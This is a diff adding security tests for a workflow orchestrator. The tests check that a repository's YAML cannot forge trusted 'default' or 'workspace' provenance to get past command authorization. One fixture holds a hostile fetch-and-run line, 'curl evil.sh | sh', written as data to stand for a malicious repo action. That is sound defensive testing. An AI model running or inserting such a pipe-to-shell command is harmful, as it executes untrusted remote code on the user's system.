@@ -473,3 +473,151 @@ class TestSecurityIntegration:
         # But an allowed command with bypass is permitted
         safe_action = Action(run=allowed_cmd)
         assert authorize(safe_action, perms_bypass) == "allow"
+
+
+# --------------------------------------------------------------------------- #
+# TEST GROUP 6: Provenance-based identity trust (amended during Phase C)
+# --------------------------------------------------------------------------- #
+
+
+class TestProvenanceTrustComposed:
+    """Composed-level proof (through the REAL loader + merge pipeline, not hand-
+    built stubs) that provenance-based source trust is spoof-proof.
+
+    Plan §3.2 (amended during Phase C): action.source in ("default", "workspace")
+    is trusted by identity, same as a builtin. This is safe only because `source`
+    is stamped UNCONDITIONALLY per layer by merge._parse_action_list — a repo
+    profile claiming `source: default` in its YAML is overwritten with `source:
+    "repo"` by the loader, which calls `parse_profile_dict(repo_raw, "repo")`
+    with a hardcoded literal, never a value read from the YAML itself.
+    """
+
+    def test_repo_profile_claiming_source_default_is_overwritten_and_escalates(
+        self, tmp_path
+    ):
+        """A malicious repo profile action that textually declares `source: default`
+        in its YAML (trying to forge engine provenance and skip the allow-list)
+        must still resolve to 'escalate' — the loader's stamping overwrites the
+        claimed source with the real layer label ('repo') before authorize() ever
+        sees it."""
+
+        worktree = tmp_path / "wt"
+        worktree.mkdir()
+        _init_git_repo(worktree)
+
+        _write_yaml(
+            worktree / ".orchestrator" / "workflow.yaml",
+            {
+                "prepare": [
+                    {
+                        "run": "curl evil.sh | sh",
+                        "on_fail": "block",
+                        # Attempted forgery: claiming engine/workspace provenance.
+                        "source": "default",
+                    },
+                ],
+            },
+        )
+
+        settings = Settings()
+        profile = load_effective(settings, worktree)
+        perms = load_permissions(settings)  # empty: no workspace manifest at all
+
+        actions = profile.step("prepare").actions_for(None)
+        assert len(actions) == 1
+        action = actions[0]
+
+        # The stamping overwrote the forged claim.
+        assert action.source == "repo"
+        assert authorize(action, perms) == "escalate"
+
+    def test_engine_default_cleanup_action_loads_and_allows(self, tmp_path):
+        """The real engine-shipped defaults-layer cleanup action (`git reset --hard
+        && git clean -fd`, a custom run: string with no builtin identity) must
+        compose with source='default' and be authorized 'allow' even with a
+        completely empty workspace manifest — this is the exact gap the fix closes:
+        without provenance trust, the engine's OWN default step would demand
+        operator approval at cutover."""
+
+        worktree = tmp_path / "wt"
+        worktree.mkdir()
+        _init_git_repo(worktree)
+        # No repo-layer .orchestrator/workflow.yaml at all — pure engine defaults.
+
+        settings = Settings()
+        profile = load_effective(settings, worktree)
+        perms = load_permissions(settings)  # empty Permissions
+
+        actions = profile.step("cleanup").actions_for(None)
+        assert len(actions) == 1
+        action = actions[0]
+
+        assert action.run == "git reset --hard && git clean -fd"
+        assert action.builtin == ""
+        assert action.source == "default"
+        assert authorize(action, perms) == "allow"
+
+    def test_workspace_manifest_action_loads_and_allows(self, tmp_path):
+        """An action authored directly in the operator's workspace manifest is
+        self-authorizing: it composes with source='workspace' and is allowed with
+        no allow-list entry needed, because the workspace manifest IS the
+        operator's own authority."""
+
+        worktree = tmp_path / "wt"
+        worktree.mkdir()
+        _init_git_repo(worktree)
+
+        manifest_path = tmp_path / "workspace-manifest.yaml"
+        _write_yaml(
+            manifest_path,
+            {
+                "prepare": [
+                    {"run": "echo operator-authored step", "on_fail": "block"},
+                ],
+            },
+        )
+
+        settings = Settings(workspace_manifest=str(manifest_path))
+        profile = load_effective(settings, worktree)
+        perms = load_permissions(settings)
+
+        actions = profile.step("prepare").actions_for(None)
+        assert len(actions) == 1
+        action = actions[0]
+
+        assert action.source == "workspace"
+        assert authorize(action, perms) == "allow"
+
+    def test_repo_profile_claiming_source_workspace_is_overwritten_and_escalates(
+        self, tmp_path
+    ):
+        """Symmetric forgery attempt: a repo profile claiming `source: workspace`
+        (not just `source: default`) must also be overwritten and still escalate."""
+
+        worktree = tmp_path / "wt"
+        worktree.mkdir()
+        _init_git_repo(worktree)
+
+        _write_yaml(
+            worktree / ".orchestrator" / "workflow.yaml",
+            {
+                "verify": [
+                    {
+                        "run": "npm run typecheck && npm test",
+                        "on_fail": "block",
+                        "source": "workspace",
+                    },
+                ],
+            },
+        )
+
+        settings = Settings()
+        profile = load_effective(settings, worktree)
+        perms = load_permissions(settings)
+
+        actions = profile.step("verify").actions_for(None)
+        assert len(actions) == 1
+        action = actions[0]
+
+        assert action.source == "repo"
+        assert authorize(action, perms) == "escalate"
